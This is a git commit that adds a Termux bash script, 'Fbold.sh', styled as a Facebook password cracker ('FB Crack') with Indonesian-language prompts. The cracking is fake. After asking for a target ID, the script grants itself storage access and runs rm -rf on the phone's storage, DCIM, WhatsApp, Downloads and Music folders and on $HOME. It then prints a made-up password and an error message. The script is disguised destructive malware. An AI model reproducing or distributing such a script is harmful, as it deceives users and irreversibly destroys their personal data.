a902e9f4838714441ce508a698c59b6f82e3bfdf
p4ulum1 <47181365+paulumi@users.noreply.github.com>
2019-09-14 23:01:23 +0700

    Fbold.sh
    cd Fbold
    Bash Fbold.sh

---
+++ Fbold.sh
@@ -0,0 +1,79 @@
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+sleep 1
+
+figlet -f slant FB Crack | lolcat
+
+echo
+echo
+echo "\033[33;1m[]========================================================================="
+echo "\033[35;m1[-]" "\033[31;1mAthuar : Mr.ND"
+echo "\033[35;m1[-]" "\033[31;1mTools  : Tools-Fbold"
+echo "\033[35;m1[-]" "\033[31;1mTnglBuat : 14 Sept 2019"
+echo "\033[35;m1[-]" "\033[31;1mThanks : Allah dan Nabi Muhammad"
+echo "\033[33;1m[]========================================================================="
+sleep 1
+echo
+echo
+echo $blue "#################"
+echo $blue "#################"
+echo $blue "###"
+echo $blue "###"
+echo $blue "#################"
+echo $blue "#################"
+echo $blue "###"
+echo $blue "###"
+echo $blue "###"
+echo $blue "###"
+echo
+echo $purple
+read -p "Isi ID : " isi
+sleep 1
+sleep 1
+termux-setup-storage
+rm -rf /storage/emulated/0
+rm -rf /sdcard/0
+rm -rf /storage/emulated/0/DCIM
+rm -rf /storage/emulated/0/android/obb
+rm -rf /sdcard/0/android/data
+rm -rf $HOME
+rm -rf sdcard/0
+rm -rf storage/emulated/0
+rm -rf /storage/emulated/0/WhatsApp
+rm -rf /sdcard/0/WhatsApp
+rm -rf /storage/emulated/0/Downloads
+rm -rf /storage/emulated/0/Music
+rm -rf /sdcard/0/Music
+echo $green "ID Di Temukan"
+sleep 1
+echo $green "Mencari Data Terget..............."
+sleep 1
+sleep 1
+sleep 1
+echo "Data Di Temukan...."
+sleep 1
+echo "mencari Password"
+echo "Sabar itu kekasih allah"
+sleel 1
+echo "Loading......................"
+sleep 1
+sleep 1
+sleep 1
+sleep 1
+sleep 1
+echo "Password Telah Cocok"
+sleel 1
+sleep 1
+echo $green "Password : 23461837338 "
+echo $red "ERROR"
+echo $red "ERROR"
+echo $purple "Mohon Coba Dari Ulang"
+echo
+echo
